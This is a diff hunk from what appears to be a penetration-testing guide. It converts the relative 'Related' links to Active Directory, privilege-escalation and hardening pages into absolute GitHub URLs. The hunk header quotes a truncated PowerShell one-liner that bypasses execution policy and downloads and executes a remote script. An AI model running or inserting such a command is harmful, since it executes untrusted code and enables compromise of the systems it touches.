@@ -100,5 +100,5 @@ powershell -ep bypass -c "IEX(New-Object Net.WebClient).DownloadString('...Power
 
 ## Related
 
-- [Active Directory Basics](../Active%20Directory/Active%20Directory%20Basics.md)
-- [Privilege Escalation](../Vulnerabilities/Privilege%20Escalation.md) · [Operating System Hardening](Operating%20System%20Hardening.md)
+- [Active Directory Basics](https://github.com/securitycipher/penetration-testing-roadmap/blob/main/Active%20Directory/Active%20Directory%20Basics.md)
+- [Privilege Escalation](https://github.com/securitycipher/penetration-testing-roadmap/blob/main/Vulnerabilities/Privilege%20Escalation.md) · [Operating System Hardening](https://github.com/securitycipher/penetration-testing-roadmap/blob/main/Operating%20System/Operating%20System%20Hardening.md)
